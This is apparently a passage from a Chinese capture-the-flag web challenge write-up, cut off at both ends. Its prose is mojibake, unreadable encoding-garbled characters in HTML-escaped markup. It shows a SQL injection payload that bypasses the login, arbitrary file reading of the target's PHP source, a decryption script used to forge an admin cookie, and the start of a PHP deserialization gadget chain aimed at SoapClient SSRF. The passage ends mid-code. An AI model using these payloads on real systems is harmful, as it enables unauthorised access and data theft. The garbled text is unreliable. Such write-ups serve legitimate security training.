&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åˆ†æžå†™è¿›åŽ»äº†ï¼Œå®ƒæœ‰ä¸€ä¸ªæ•°æ®æ˜¯å¦ä¸º1è¡Œçš„åˆ¤æ–­ï¼Œè¯´æ˜Žç”¨æˆ·ä¸æ­¢ä¸€ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&lt;code>limit 1 offset x&lt;/code>æ¥åˆ¤æ–­äººæ•°ï¼›ç¬¬ä¸‰ä¸ªè¿‡æ»¤éœ€è¦è¾“å…¥çš„å¯†ç å’Œæ•°æ®åº“ä¸­çš„ç›¸åŒï¼Œå¯ä»¥ä½¿ç”¨&lt;code>group by pwd with rollup&lt;/code>è¯­å¥ï¼Œåˆ†ç»„åŽä¼šå¤šä¸€è¡Œç»Ÿè®¡ï¼Œåœ¨groupåˆ†ç»„å­—æ®µçš„åŸºç¡€ä¸Šå†ç»Ÿè®¡æ•°æ®ï¼Œä¼šå‡ºçŽ°è¿™æ ·çš„æ•ˆæžœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211102738054.png" alt="image-20211211102738054">&lt;/p>
&lt;p>ä¼šå‡ºçŽ°ä¸€ä¸ªNULLï¼ˆæœ€åŽçš„æ€»æ•°æ®è¿˜ä¼šå¤šä¸€ä¸ªNULLï¼‰ï¼Œæ„Ÿè§‰å¾ˆç±»ä¼¼è”åˆæŸ¥è¯¢çš„æ—¶å€™å‡­ç©ºå¤šä¸€ç»„æ•°æ®ï¼›æˆ‘ä»¬å°±éœ€è¦è¿™ä¸ªpass=nullçš„æ•°æ®ï¼Œç”¨&lt;code>having passwd is NULL&lt;/code>ï¼›ä»¥ä¸‹æ˜¯æœ¬é¢˜çš„payload&lt;/p>
&lt;pre tabindex="0">&lt;code>1'or '1'='1' group by passwd with rollup having passwd is NULL#
&lt;/code>&lt;/pre>&lt;p>ç©ºå¯†ç å³å¯æˆåŠŸç™»å…¥&lt;/p>
&lt;p>æ‰«ç›®å½•æœ‰ä¸€ä¸ª&lt;code>wsdl.php&lt;/code>ï¼Œçœ‹åˆ°äº†ç†Ÿæ‚‰çš„SoapClientï¼Œè¿˜æç¤ºäº†è¿™äº›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211103657986.png" alt="image-20211211103657986">&lt;/p>
&lt;p>Service.phpå’ŒInterface.phpéƒ½è¯»ä¸åˆ°ï¼Œé‚£åªèƒ½è¯»å‰©ä¸‹çš„ä¸€äº›methodäº†ï¼ŒæŽ¥åœ¨/index.php?method=åŽé¢çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211103814401.png" alt="image-20211211103814401">&lt;/p>
&lt;p>è¿˜æœ‰/index.php?method=get_flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211104700711.png" alt="image-20211211104700711">&lt;/p>
&lt;p>å†ç»“åˆä¸Šé¢çš„SoapClientï¼Œè‚¯å®šæ˜¯è¦ååºåˆ—åŒ–SoapClient+SSRFäº†&lt;/p>
&lt;p>è¿˜æœ‰/index.php?method=File_readï¼Œå¯ä»¥æŽ¥ä¸€ä¸ªPOSTå‚æ•°filenameï¼Œæˆ‘ä»¬è¯»ä¸€ä¸‹æºç &lt;/p>
&lt;p>index.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ob_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;encode.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Service.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">//error_reporting(0);
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">//phpinfo();
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">$method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">//echo 1231;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$allow_method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;File_read&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;index&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;hint&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;get_flag&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$allow_method&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;not allow method&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;File_read&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$param&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;filename&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$param2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$param&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$param2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;passwd&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;method can use&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$newclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Service&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$newclass&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$param&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$param2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">ob_flush&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯»ä¸€ä¸‹Service.phpæ²¡æƒé™ï¼Œè¯»encode.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">en_crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$swpuctf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$varch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$j&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$h&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">$swpuctf&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$varch&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$swpu&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$j&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$swpu&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#75af00">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#111">})&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$varch&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#111">}))&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ‰ä¸ªKeyï¼Œæˆ‘ä»¬è¯»keyaaaaaaaasdfsaf.txtå¾—åˆ°&lt;code>flag{this_is_false_flag}&lt;/code>ï¼Œåº”è¯¥è¿™ä¸ªå°±æ˜¯keyï¼›æžä¸€ä¸ªå¯¹åº”çš„è§£å¯†è„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">de_crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$swpuctf&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$varch&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">$swpuctf&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$varch&lt;/span>&lt;span style="color:#f92672">.=&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#75af00">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$swpu&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#111">})&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$varch&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$j&lt;/span>&lt;span style="color:#111">}))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">256&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„åˆ°æˆ‘ä»¬è®¿é—®çš„æ—¶å€™cookieä¼šæœ‰ä¸€ä¸ªuserå­—æ®µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211110212036.png" alt="image-20211211110212036">&lt;/p>
&lt;p>ç”¨ä¸Šé¢é‚£ä¸ªè§£å¯†è„šæœ¬è¿›è¡Œè§£å¯†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">de_crypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;3J6Roahxag==&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{this_is_false_flag}&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75715e">// xiaoC:2
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬ä¼ªé€ ä¸€ä¸ª&lt;code>admin:1&lt;/code>é‡æ–°åŠ å¯†å›žåŽ»ï¼Œå¾—åˆ°&lt;code>xZmdm9NxaQ==&lt;/code>ï¼Œç”¨File_readè¯»ä¸€ä¸‹å‰é¢æåˆ°çš„se.phpï¼Œå¥½å®¶ä¼™ï¼Œæžœç„¶ååºåˆ—åŒ–ï¼Œè€Œä¸”æ˜¯ç»“åˆäº†SoapClientå’Œsession&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">aa&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod2&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $cc
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$param&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$s1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$s1&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// $cc-&amp;gt;__invoke
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ke&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod2&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$ke&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">bb&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $aa
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod1&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test2&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// $aa-&amp;gt;__call
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">cc&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $ee
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mod3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__invoke&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mod1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $ee-&amp;gt;__toString
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">dd&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
